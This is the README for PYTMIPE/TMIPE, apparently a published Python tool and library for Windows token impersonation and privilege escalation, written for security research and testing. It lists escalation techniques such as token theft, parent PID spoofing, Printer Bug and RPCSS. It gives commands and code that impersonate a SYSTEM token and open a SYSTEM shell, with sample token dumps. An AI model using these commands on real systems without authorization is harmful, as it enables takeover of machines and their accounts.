PYTMIPE & TMIPE
====

__PYTMIPE__ (PYthon library for Token Manipulation and Impersonation for Privilege Escalation) is a Python 3 library for manipulating Windows tokens and managing impersonations in order to gain more privileges on Windows. __TMIPE__ is the python 3 client which uses the *pytmipe* library.

Content
====

* A __python client__: *tmipe* (*python3 tmipe.py*)
* A __python library__: *pytmipe*. Useful for including this project in another one
* __pytinstaller examples__, for getting __standalones__ exes

Docs
====
* Slides "Windows Token Manipulation, Impersonation & Privilege Escalation" (English): [link](https://github.com/quentinhardy/pytmipe/blob/master/doc/Windows_Tokens_Impersonation_PE_Quentin_HARDY_2020_v1.0.pdf)

* Article in MISC 112 (French): [link](https://connect.ed-diamond.com/MISC/MISC-112/Manipulation-de-tokens-impersonation-et-elevation-de-privileges)

Main features
====

| Method    | Required Privilege(s)           |  OS (no exhaustive)  | Direct target (max)  |
| --------------- |:------------------------------------------:| --------------------------------:|----------------------------------:|
| Token creation & impersonation |  username & password   |   All  |  local administrator   |
| Token Impersonation/Theft  |  *SeDebugPrivilege*      |  All    |  *nt authority\system*  |
| Parent PID spoofing (handle inheritance) |  *SeDebugPrivilege*   |  >= Vista |  *nt authority\system*   |
|  Service (SCM) | Local administrator (and high integrity level if UAC enabled)   | All   |  *nt authority\system* or domain account   |
|  WMI Event | Local administrator (and high integrity level if UAC enabled)   | All  |  *nt authority\system*   |
|  « Printer Bug » LPE | *SeImpersonatePrivilege* (Service account)   | Windows 8.1, 10 & Server 2012R2/2016/2019  |  *nt authority\system*   |
|  RPCSS Service LPE | *SeImpersonatePrivilege* (Service account)   | Windows 10 & Server 2016/2019 |  *nt authority\system*   |

Capabilities
====

The following __non-exhaustive__ list shows some features implemented in *pytmipe* library:
* Token and privileges management:
  * get, enable or disable privilege(s) on token for current or remote thread
  * get local or remote token information
  * get effective token for current thread (impersonation or primary token)
* get many information about selected token(s):
  * elevation type, impersonation type, Linked token with details, SID, ACLs, default groups, primary group, owner, privileges, source
  * etc
* __List all tokens which are accessible__ (primary & impersonation tokens) from current thread:
  * 2 different methods implemented: "thread" method and __"handle"__ method (favorite)
  * check if token can be impersonated
  * get information about each token (elevation type, impersonation type, Linked token, SID, etc)
  * get all tokens which are accessible by account name (SID)
* Impersonate a token or user:
  * Make Token and Impersonate (requires credentials of user)
  * Token impersonation/theft (specific privileges are required): impersonate a chosen token
  * Create Process with a token (specific privileges are required): impersonate a chosen token and create new process
  * __Impersonate first *nt authority\system* token__ found
  * impersonate primary token of remote process with pid
* Escalation methods:
  * __Parent PID Spoofing__ - Handle Inheritance
  * Service Manager via direct command or named pipe impersonation: local administrator to *nt authority\system* (or orther privileged account)
  * Task scheduler via direct command or named pipe impersonation: local administrator to *nt authority\system*
  * WMI job via direct command or named pipe impersonation: local administrator to *nt authority\system*
  * __Printer Bug__: *SeImpersonatePrivilege* to *nt authority\system*
  * __RPCSS__: *SeImpersonatePrivilege* to *nt authority\system*
  * __Re enable privileges__ via task scheduling and named pipe impersonation
  
Dependencies
====

*ctypes* is used a maximum of time.
Many features of *pywin32* have been re developped in pytmipe to avoid the use of *pywin32* for better portability.
However, Task Scheduler module still uses *pywin32* (more precisely *pythoncom*) by lack of time.
All other modules uses ctypes only.

HOW TO USE
====

For __python client__ (named *tmipe*):

```console
python.exe tmipe.py -h
usage: tmipe.py [-h] [--version]
                {cangetadmin,printalltokens,printalltokensbyname,printalltokensbypid,printsystemtokens,searchimpfirstsystem,imppid,imptoken,printerbug,rpcss,spoof,impuser,runas,scm}
                ...

                      **
    888888  8b    d8  88  88""Yb  888888
      88    88b  d88  88  88__dP  88__
      88    88YbdP88  88  88"""   88""
      88    88 YY 88  88  88      888888
-------------------------------------------
Token Manipulation, Impersonation and
     Privilege Escalation (Tool)
-------------------------------------------
By Quentin HARDY (quentin.hardy@protonmail.com)

positional arguments:
  {cangetadmin,printalltokens,printalltokensbyname,printalltokensbypid,printsystemtokens,searchimpfirstsystem,imppid,imptoken,printerbug,rpcss,spoof,impuser,runas,scm}

                         Choose a main command
    cangetadmin          Check if user can get admin access
    printalltokens       Print all tokens accessible from current thread
    printalltokensbyname
                         Print all tokens accessible from current thread by account name
    printalltokensbypid  Print all tokens accessible from current thread by pid
    printsystemtokens    Print all system tokens accessible from current
    searchimpfirstsystem
                         search and impersonate first system token
    imppid               impersonate primary token of selected pid and try to spawn cmd.exe
    imptoken             impersonate primary or impersonation token of selected pid/handle and try to spawn cmd.exe
    printerbug           exploit the "printer bug" for getting system shell
    rpcss                exploit "rpcss" for getting system shell
    spoof                parent PID Spoofing ("handle inheritance)"
    impuser              create process with creds with impersonation
    runas                create process with creds as runas
    scm                  create process with Service Control Manager

optional arguments:
  -h, --help             show this help message and exit
  --version              show program's version number and exit
```

For __python library__ (named *pytmipe*), see source code and examples.
Normally, I have well documented the source code...
Most of functions are documented.

For __pyinstaller examples__ and standalones, see files in *src/examples/* folders.

Examples
====

If you want to know how to use *pytimpe* library, see *src/examples* folder for many examples.

Example 1: get *nt authority\system*
---------

For impersonating the first *system* token and get a cmd.exe prompt as *system* from python client (*tmipe*):
```console
python.exe tmipe.py searchimpfirstsystem -vv
```

For doing the same thing thanks to the *pytmipe* library directly, see the *src/examples/searchAndImpersonateFirstSystemToken.py*:
```python
from impersonate import Impersonate
from utils import configureLogging

configureLogging()
imp = Impersonate()
imp.searchAndImpersonateFirstSystemToken(targetPID=None, printAllTokens=False)
```
It will open a cmd.exe prompt as *system* if the current Windows user has required rights.

Of course, from this source code, you can create a standlone exe with *pyinstaller*.

Example 2: get tokens
---------

For getting primary and impersonation(s) tokens used in current process:
```console
python.exe tmipe.py printalltokens --current --full --linked
```

Output:
```console
- PID: 3212
------------------------------
  - PID: 3212
  - type: Primary (1)
  - token: 764
  - hval: None
  - ihandle: None
  - sid: S-1-5-18
  - accountname: {'Name': 'SYSTEM', 'Domain': 'NT AUTHORITY', 'type': 1}
  - intlvl: System
  - owner: S-1-5-32-544
  - Groups:
    - S-1-5-32-544: {'Name': 'Administrators', 'Domain': 'BUILTIN', 'type': 4} (ENABLED, ENABLED_BY_DEFAULT, OWNER)
    - S-1-1-0: {'Name': 'Everyone', 'Domain': '', 'type': 5} (ENABLED, ENABLED_BY_DEFAULT, MANDATORY)
    - S-1-5-11: {'Name': 'Authenticated Users', 'Domain': 'NT AUTHORITY', 'type': 5} (ENABLED, ENABLED_BY_DEFAULT, MANDATORY)
    - S-1-16-16384: {'Name': 'System Mandatory Level', 'Domain': 'Mandatory Label', 'type': 10} (INTEGRITY_ENABLED, INTEGRITY)
  - Privileges (User Rights):
    - SeAssignPrimaryTokenPrivilege: Enabled
    [...]
    - SeTrustedCredManAccessPrivilege: Enabled
  - issystem: True
  - sessionID: 1
  - elevationtype: Default (1)
  - iselevated: True
  - Linked Token: None
  - tokensource: b'*SYSTEM*'
  - primarysidgroup: S-1-5-18
  - isrestricted: False
  - hasrestricitions: True
  - Default DACL:
    - {'ace_type': 'ALLOW', 'ace_flags': '', 'rights': '0x10000000', 'object_guid': '', 'inherit_object_guid': '', 'account_sid': 'S-1-5-18'}
    - {'ace_type': 'ALLOW', 'ace_flags': '', 'rights': '0xa0020000', 'object_guid': '', 'inherit_object_guid': '', 'account_sid': 'S-1-5-32-544'}
  [...]
  - Mandatory Policy: NO_WRITE_UP
```

For getting all tokens which are accessible from current thread, organized by pid, when the impersonation is possible only:
```console
python.exe tmipe.py printalltokensbypid --imp-only
```

Output:
```console
[...]
- PID 4276:
        - S-1-5-18: NT AUTHORITY\SYSTEM (possible imp: True)
- PID 7252:
        - None
- PID 1660:
        - S-1-5-21-28624056-3392308708-440876048-1106: DOMAIN\USER (possible imp: True)
        - S-1-5-20: NT AUTHORITY\NETWORK SERVICE (possible imp: True)
        - S-1-5-18: NT AUTHORITY\SYSTEM (possible imp: True)
        - S-1-5-90-0-1: Window Manager\DWM-1 (possible imp: True)
        - S-1-5-19: NT AUTHORITY\LOCAL SERVICE (possible imp: True)
[...]
```

If you want to do this operation with the *pytmipe* library, it is easy too:
```python
from impersonate import Impersonate
from utils import configureLogging

configureLogging()
imp = Impersonate()
imp.printAllTokensAccessible(targetPID=None, printFull=True, printLinked=True, _useThreadMethod=False)
```

Example 3: impersonate token
---------

You can impersonate a selected token.

First step, get all tokens according to your filters (*system* tokens and tokens which can be impersonated by current thread):
```console
python.exe tmipe.py printalltokens --filter {\"sid\":\"S-1-5-18\",\"canimpersonate\":true}
```

Output:
```console
[...]
- PID: 2288
------------------------------
  - PID: 2288
  - type: Impersonation (2)
  - token: 2504
  - ihandle: 118
  - sid: S-1-5-18
  - accountname: {'Name': 'SYSTEM', 'Domain': 'NT AUTHORITY', 'type': 1}
  - intlvl: System
  - owner: S-1-5-18
  - issystem: True
  - elevationtype: Default (1)
  - iselevated: True
  - linkedtoken: None
  - implevel: Impersonate (2)
  - appcontainertoken: False
  [...]
  - primarysidgroup: S-1-5-18
  - isrestricted: False
  - hasrestricitions: True
  - Mandatory Policy: VALID_MASK
  - canimpersonate: True
[...]
```

This previous output shows an impersonation token located in the pid 2288 (ihandle 118), which has an integrity level *system*.
It is possible to impersonate this specific token with the following command:
```console
python.exe tmipe.py imptoken --pid 2288 --ihandle 118 -vv
```

This previous command opens a cmd.exe as *nt authority\system*.

This can be done with the *pytmipe* library too. 
Following source code impersonates the first *system* token available, prints effective token and it stops impersonation:
```python
from impersonate import Impersonate
from windef import TokenImpersonation

allTokens = imp.getTokensAccessibleFilter(targetPID=None,
                                          filter={'canimpersonate':True, 'sid':'S-1-5-18', 'type':TokenImpersonation},
                                          _useThreadMethod=False)
if allTokens == {} or allTokens==None:
    print("No one token found for impersonation")
else:
    pid = list(allTokens.keys())[0] #use the first token of the first pid returned in 'allTokens'
    firstIHandle = allTokens[pid][0]['ihandle']
    imp.printThisToken(allTokens, pid, firstIHandle)
    imp.impersonateThisToken(pid=pid, iHandle=firstIHandle)
    print("Current Effective token for current thread after impersonation:")
    imp.printCurrentThreadEffectiveToken(printFull=False, printLinked=False)
    imp.terminateImpersonation()
    print("Current Effective token for current thread (impersonation finished):")
    imp.printCurrentThreadEffectiveToken(printFull=False, printLinked=False)
```

Donation
====
If you want to support my work doing a donation, I will appreciate a lot:

Via BTC: 36FugL6SnFrFfbVXRPcJATK9GsXEY6mJbf
